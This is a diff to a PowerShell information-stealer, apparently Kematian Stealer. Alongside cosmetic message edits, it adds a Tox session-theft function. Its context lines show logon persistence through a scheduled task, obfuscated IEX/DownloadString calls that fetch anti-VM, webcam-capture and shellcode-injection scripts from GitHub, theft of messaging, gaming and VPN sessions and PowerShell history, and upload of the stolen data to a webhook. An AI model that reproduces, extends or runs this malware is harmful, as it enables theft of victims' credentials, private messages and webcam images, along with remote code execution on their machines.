@@ -6,7 +6,6 @@ $melt = $false
 $fakeerror = $false
 $persistence = $true
 
-
 if ($debug) {
     $ProgressPreference = 'Continue'
 }
@@ -90,7 +89,7 @@ function Invoke-TASKS {
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
-        Write-Host "[!] Task Created" -ForegroundColor Green
+        Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
         $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
@@ -102,7 +101,7 @@ function Invoke-TASKS {
 function VMPROTECT {
     $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
-    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
+    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
 
 
@@ -123,7 +122,8 @@ function Request-Admin {
 }
 
 function Backup-Data {
-
+    
+    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
@@ -175,7 +175,8 @@ function Backup-Data {
     $lang = (Get-WinUserLanguageList).LocalizedName
     $date = Get-Date -Format "r"
     $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
-    $osbuild = (Get-ItemProperty -Path "C:\Windows\System32\hal.dll").VersionInfo.FileVersion
+    $windowsVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    $buildNumber = $windowsVersion.CurrentBuild;$ubR = $windowsVersion.UBR;$osbuild = "$buildNumber.$ubR" 
     $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
     $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
     $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
@@ -302,11 +303,11 @@ function Backup-Data {
     }
     Get-ProductKey > $folder_general\productkey.txt
 
-    try {Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 -ErrorAction SilentlyContinue}catch{}
+    Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 
 
     # All Messaging Sessions
     
-    # Telegram Session
+    # Telegram 
     function telegramstealer {
         $processname = "telegram"
         $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
@@ -346,7 +347,7 @@ function Backup-Data {
     telegramstealer
 
 
-    # Element Session 
+    # Element  
     function elementstealer {
         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
         if (!(Test-Path $elementfolder)) { return }
@@ -358,7 +359,7 @@ function Backup-Data {
     elementstealer
 
 
-    # ICQ Session 
+    # ICQ  
     function icqstealer {
         $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
         if (!(Test-Path $icqfolder)) { return }
@@ -369,7 +370,7 @@ function Backup-Data {
     icqstealer
 
 
-    # Signal Session 
+    # Signal  
     function signalstealer {
         $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
         if (!(Test-Path $signalfolder)) { return }
@@ -382,7 +383,7 @@ function Backup-Data {
     signalstealer
 
 
-    # Viber Session 
+    # Viber  
     function viberstealer {
         $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
         if (!(Test-Path $viberfolder)) { return }
@@ -405,7 +406,7 @@ function Backup-Data {
     viberstealer
 
 
-    # Whatsapp Session 
+    # Whatsapp  
     function whatsappstealer {
         $whatsapp_session = "$folder_messaging\Whatsapp"
         New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
@@ -430,7 +431,7 @@ function Backup-Data {
     }
     whatsappstealer
 
-    # Skype Session
+    # Skype 
     function skype_stealer {
         $skypefolder = "$env:appdata\microsoft\skype for desktop"
         if (!(Test-Path $skypefolder)) { return }
@@ -440,6 +441,8 @@ function Backup-Data {
     }
     skype_stealer
     
+	
+	# Pidgin 
     function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
         if (!(Test-Path $pidgin_folder)) { return }
@@ -448,10 +451,20 @@ function Backup-Data {
         Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
     }
     pidgin_stealer
+	
+	# Tox 
+    function tox_stealer {
+            $tox_folder = "$env:appdata\Tox"
+            if (!(Test-Path $tox_folder)) { return }
+            $tox_session = "$folder_messaging\Tox"
+            New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
+            Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
+    }
+    tox_stealer
 
     # All Gaming Sessions
     
-    # Steam Session Stealer
+    # Steam 
     function steamstealer {
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
         if (!(Test-Path $steamfolder)) { return }
@@ -466,7 +479,7 @@ function Backup-Data {
     steamstealer
 
 
-    # Minecraft Session Stealer
+    # Minecraft 
     function minecraftstealer {
         $minecraft_session = "$folder_gaming\Minecraft"
         if (!(Test-Path $minecraft_session)) { return }
@@ -478,7 +491,7 @@ function Backup-Data {
     }
     minecraftstealer
 
-    # Epicgames Session Stealer
+    # Epicgames 
     function epicgames_stealer {
         $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
         if (!(Test-Path $epicgamesfolder)) { return }
@@ -490,7 +503,7 @@ function Backup-Data {
     }
     epicgames_stealer
 
-    # Ubisoft Session Stealer
+    # Ubisoft 
     function ubisoftstealer {
         $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
         if (!(Test-Path $ubisoftfolder)) { return }
@@ -500,7 +513,7 @@ function Backup-Data {
     }
     ubisoftstealer
 
-    # EA Session Stealer
+    # EA 
     function electronic_arts {
         $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
         if (!(Test-Path $eafolder)) { return }
@@ -513,7 +526,7 @@ function Backup-Data {
     }
     electronic_arts
 
-    # Growtopia Stealer
+    # Growtopia 
     function growtopiastealer {
         $growtopiafolder = "$env:localappdata\Growtopia"
         if (!(Test-Path $growtopiafolder)) { return }
@@ -524,6 +537,7 @@ function Backup-Data {
     }
     growtopiastealer
 
+    # Battle.net
     function battle_net_stealer {
         $battle_folder = "$env:appdata\Battle.net"
         if (!(Test-Path $battle_folder)) { return }
@@ -538,7 +552,6 @@ function Backup-Data {
 
 
     # All VPN Sessions
-
 
     # ProtonVPN
     function protonvpnstealer {   
@@ -699,12 +712,11 @@ Pass: $decodedPass
 
     # Fix webcam hang with unsupported devices
     
-    Write-Host "[!] Capturing an image with Webcam !" -ForegroundColor Green
+    Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
     $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $invokewebcam.WaitForExit()
-    Write-Host "[!] Webcam captured !" -ForegroundColor Green
 
     # Works since most victims will have a weak password which can be bruteforced
     #function ExportPrivateKeys {
@@ -790,20 +802,15 @@ Pass: $decodedPass
             }
         }
     }
-
-    #try {
-    #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
-    #}
-    #catch {}
     
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
-    Write-Host "[!] Injecting Shellcode !" -ForegroundColor Green
+    Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
     $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
-    Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
+    Write-Host "[!] Shellcode Injection Completed" -ForegroundColor Green
 
 
     $main_temp = "$env:localappdata\temp"
@@ -821,7 +828,7 @@ Pass: $decodedPass
     $image.Dispose()
 
 
-    Write-Host "[!] Screenshot Captured !" -ForegroundColor Green
+    Write-Host "[!] Screenshot Captured" -ForegroundColor Green
 
     Move-Item "$main_temp\discord.json" $folder_general -Force    
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
@@ -839,7 +846,7 @@ Pass: $decodedPass
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
     
-    Write-Host "[!] Getting information about the extracted data !" -ForegroundColor Green
+    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
     
     function ProcessCookieFiles {
         $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
@@ -1004,7 +1011,7 @@ FileZilla: $filezilla_info
         }
     }
 
-    Write-Host "[!] Uploading the extracted data !" -ForegroundColor Green
+    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
         "username"    = "Kematian"
         "content"     = "@everyone"
@@ -1132,7 +1139,7 @@ if (CHECK_AND_PATCH -eq $true) {
     }
 }
 else {
-    Write-Host "[!] Please run as admin!" -ForegroundColor Red
+    Write-Host "[!] Please run as admin !" -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
 }
